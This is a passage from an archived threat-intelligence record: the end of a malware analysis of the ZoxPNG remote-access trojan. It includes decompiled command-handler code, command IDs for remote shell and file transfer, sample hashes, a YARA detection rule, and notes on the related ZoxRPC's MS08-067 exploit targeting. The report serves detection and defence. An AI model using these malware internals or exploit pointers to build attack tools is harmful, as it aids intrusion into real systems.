data->dwHandlerID;\n  v5 = dwHandlersCnt;\n  if ( dwHandlersCnt <= desiredCmdID )\n  {\n   while (dwHandlersCnt != data->dwHandlerID )\n   {\n    pfnHandlers[dwHandlersCnt++ - 397312] = PlaceHolderCommand;\n   }\n   pfnHandlers[dwHandlersCnt - 397312] = pFunc;\n   dwHandlerID = dwHandlersCnt++;\n  }\n  else if ( pfnHandlers )\n  {\n   pfnHandlers[desiredCmdID - 397312] = pFunc;\n   dwHandlerID = data->dwHandlerID;\n  }\n }\n\n```\n_Figure 5: Command Handler Installation/Update Routine_\n\nIf the desiredCmdID is a value larger than the next available command ID, the command\nhandler will fill the command IDs between the last valid command ID and the desiredCmdID\nwill a filler function (PlaceHolderCommand). The PlaceHolderCommand returns a\n```\nCommandHeader with the dwCommandID set to the requested command ID, the dwLastError\n\n```\nset to 2 (ERROR_FILE_NOT_FOUND), the dwPayloadSize set to the length of the string within\nthe payload, and the payload containing the NULL-terminated string “Not Support This\n```\nFunction!”. \n\n```\n\n-----\n\nWhat is not obvious, but important to note, is that not only can the Add/Update Command\ncommand add new functionality, it can replace existing commands.\n\nAfter the command handler has concluded the installation of the new (or updated) command\nhandler, the command handler will return a CommandHeader with the dwCommandID field\nwithin the CommandData structure set to 0x8006100D. If the installation of the new command\nhandler was successful, the command handler will append the new command handler’s\ncommand ID value to the end of the CommandHeader and set the dwPayloadSize to 4. If,\nhowever, installation of the new command handler was unsuccessful, the command handler will\nreturn only a CommandHeader structure with the dwCommandID field set to 0x8006100D and\nthe dwLastError set to the return value from GetLastError.\n\n### Command 0x8006100E: Shutdown ZoxPNG\nThe Shutdown command takes no arguments. Upon activation, the Shutdown handler\nterminates any active remote command shell processes (e.g. cmd.exe), terminates any open\npipes, and returns without providing any additional response data. After the shutdown command\nconcludes, the ZoxPNG binary will sleep for 20 seconds before again re-engaging the main\ncommunication loop thereby effectively rendering the Shutdown command a 20 second sleep\ncommand.\n\n## Known Samples\nThe following table identifies the known ZoxPNG samples along with key metadata for each.\n\n**SHA1** **Compile Date** **File Size**\n**60415999bc82dc9c8f4425f90e41a98d514f76a2** 10 May 2013 at 44,432 bytes\n07:16:54\n\n**40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08** 10 May 2013 at 47,200 bytes\n\n07:16:54\n\n**7dd556415487cc192b647c9a7fde70896eeee7a2** 10 May 2013 at 47,207 bytes\n\n07:16:54\n\nTwo of the known samples (SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 and\nSHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2) are signed using a signature from “4NB\nCorp.” which appears to be a South Korean video conferencing and cloud service provider\n(www.4nb.co.kr). The signing certificate for the two samples has a valid time range of 21 June\n2011 to 21 July 2013. Sample SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 reports a\nvalid digital signature whereas sample SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2\nreports that the certificate has expired. Figures 6 and 7 show the differences between the two\ndigital signatures for the signed samples.\n\n|SHA1 Compile Date File Size|Col2|Col3|\n|---|---|---|\n|60415999bc82dc9c8f4425f90e41a98d514f76a2|10 May 2013 at 07:16:54|44,432 bytes|\n|40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08|10 May 2013 at 07:16:54|47,200 bytes|\n|7dd556415487cc192b647c9a7fde70896eeee7a2|10 May 2013 at 07:16:54|47,207 bytes|\n\n\n-----\n\n_Figure 6: Sample_\n_40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08's Digital_\n\n_Signature_\n\n\n_Figure 7: Sample_\n_60415999bc82dc9c8f4425f90e41a98d514f76a2's Digital_\n\n_Signature_\n\n\n## Detection\nDetecting ZoxPNG over the network could be possible by looking for the following string which\nappears to be static among the observed samples:\n```\npng&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i\n:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty\n=58\n\n```\nDetecting ZoxPNG on disk is possible using the same string as indicated in the following YARA\nsignature:\n```\nrule zox\n{\n   strings:\n       $url =\n\"png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,\ni:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&t\ny=58\"\n   condition:\n       $url\n}\n\n```\n\n-----\n\n## Evolution\nSample SHA1:b51e419bf999332e695501c62c5b4aee5b070219 appears to have a tangential\nrelationship to the ZoxPNG samples listed above. The sample, known as ZoxRPC, has a\ncompile date of 11 July 2008 at 04:28:21, placing it nearly 5 years ahead of the known ZoxPNG\nsamples. Given the large time differential between ZoxRPC and ZoxPNG, making a direct\nrelationship between the two generations is difficult. There are several attributes that would\nappear to indicate a connection between the two Zox variants:\n\n1. The use of the term “iiscmd” with a relationship to the remote shell functionality\n2. The identifiers used for each command roughly align.\n\n**ZoxRPC ID** **ZoxPNG ID** **Function Description**\n`0x80061001` `0x80061001` **Initiate a remote shell**\n`0x80061005 0x80061002` **Interact with the remote shell (send command, read**\n\n**response)**\n`0x80061003` `0x80061003` **Download a file from the C2 to the victim’s machine**\n`0x80061002 0x80061004` **Upload a file to the C2 from the victim’s machine**\n\nZoxRPC uses the MS08-067 vulnerability, specifically portions of code found on this public\nwebsite: http://www.pudn.com/downloads183/sourcecode/hack/exploit/detail861817.html. One\ninteresting aspect of the ZoxRPC malware is the list of targeting offsets for the MS08-067\nexploit. The offsets are associated with specific regional version of Windows. The following\nidentifiers were found within ZoxRPC:\n\n  - `KR Windows All bypass DEP`\n\n  - `JP Windows All bypass DEP`\n\n  - `EN Windows All bypass DEP`\n\n  - `TW Windows All bypass DEP`\n\n  - `CN Windows All bypass DEP`\n\nThe list itself indicates a specific set of regional targets that the operators of ZoxRPC are going\nafter.\n\nBy researching the unique strings related to the iiscmd, iisput, and iisget strings, it appears that\nthe original source code, upon which all Zox variants are based, dates back to 2002. As part of\nthe IIS vulnerability disclosure of 2002 for the vulnerability MS02-018, the source code for the\nproof of concept code contains not only several strings found within the Zox binaries, but\nseveral of the functions as well. The source code upon which the Zox family is based is found at\nhttp://www.exploit-db.com/download/21371/, which was written by well-known Chinese hacker\nyuange. Given the several years between the original source code (2002) and both ZoxPNG\n(2013) and ZoxRPC (2008), the code upon which Zox is based has mutated and evolved, but\nthere are clearly sections of code that have remained largely unaltered.\n\n|ZoxRPC ID ZoxPNG ID Function Description|Col2|Col3|\n|---|---|---|\n|0x80061001|0x80061001|Initiate a remote shell|\n|0x80061005|0x80061002|Interact with the remote shell (send command, read response)|\n|0x80061003|0x80061003|Download a file from the C2 to the victim’s machine|\n|0x80061002|0x80061004|Upload a file to the C2 from the victim’s machine|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/8wxap100crzcd96a05ajsj9vodpjauau",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.10.14.ZoxPNG/ZoxPNG_Full_Analysis-Final.pdf",
        "https://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf",
        "http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf"
    ],
    "report_names": [
        "ZoxPNG_Full_Analysis-Final",
        "ZoxPNG.pdf"
    ],
    "threat_actors": [
        {
            "id": "ca3acede-fb02-418a-8f2b-a73d8c89eda7",
            "created_at": "2023-06-23T02:04:34.425347Z",
            "updated_at": "2025-03-27T02:02:10.026299Z",
            "deleted_at": null,
            "main_name": "OilAlpha",
            "aliases": [
                "TAG-41",
                "TAG-62"
            ],
            "source_name": "ETDA:OilAlpha",
            "tools": [
                "Bladabindi",
                "CypherRat",
                "Jorik",
                "SpyMax",
                "SpyNote",
                "SpyNote RAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2d06d270-acfd-4db8-83a8-4ff68b9b1ada",
            "created_at": "2022-10-25T16:07:23.477794Z",
            "updated_at": "2025-03-27T02:02:09.824281Z",
            "deleted_at": null,
            "main_name": "Cold River",
            "aliases": [
                "Blue Callisto",
                "BlueCharlie",
                "Calisto",
                "Cobalt Edgewater",
                "Nahr Elbard",
                "Nahr el bared",
                "Seaborgium",
                "Star Blizzard",
                "TA446",
                "TAG-53",
                "UNC4057"
            ],
            "source_name": "ETDA:Cold River",
            "tools": [
                "Agent Drable",
                "AgentDrable",
                "DNSpionage",
                "SPICA"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b98eb1ec-dc8b-4aea-b112-9e485408dd14",
            "created_at": "2022-10-25T16:07:23.649308Z",
            "updated_at": "2025-03-27T02:02:09.906895Z",
            "deleted_at": null,
            "main_name": "FunnyDream",
            "aliases": [
                "Bronze Edgewood",
                "Red Hariasa",
                "TAG-16"
            ],
            "source_name": "ETDA:FunnyDream",
            "tools": [
                "Chinoxy",
                "Filepak",
                "FilepakMonitor",
                "FunnyDream",
                "Keyrecord",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Md_client",
                "PCShare",
                "ScreenCap",
                "TcpBridge",
                "Tcp_transfer",
                "ccf32"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "79bd28a6-dc10-419b-bee7-25511ae9d3d4",
            "created_at": "2023-01-06T13:46:38.581534Z",
            "updated_at": "2025-03-27T02:00:02.865836Z",
            "deleted_at": null,
            "main_name": "Callisto",
            "aliases": [
                "GOSSAMER BEAR",
                "BlueCharlie",
                "Star Blizzard",
                "TAG-53",
                "UNC4057",
                "COLDRIVER",
                "TA446",
                "IRON FRONTIER",
                "Blue Callisto",
                "SEABORGIUM"
            ],
            "source_name": "MISPGALAXY:Callisto",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041533,
    "ts_creation_date": 1414461697,
    "ts_modification_date": 1414461697,
    "files": {
        "pdf": "https://archive.orkl.eu/d24ff42b2d02ba406d46f3912f1f7bd2d38b6113.pdf",
        "text": "https://archive.orkl.eu/d24ff42b2d02ba406d46f3912f1f7bd2d38b6113.txt",
        "img": "https://archive.orkl.eu/d24ff42b2d02ba406d46f3912f1f7bd2d38b6113.jpg"
    }
}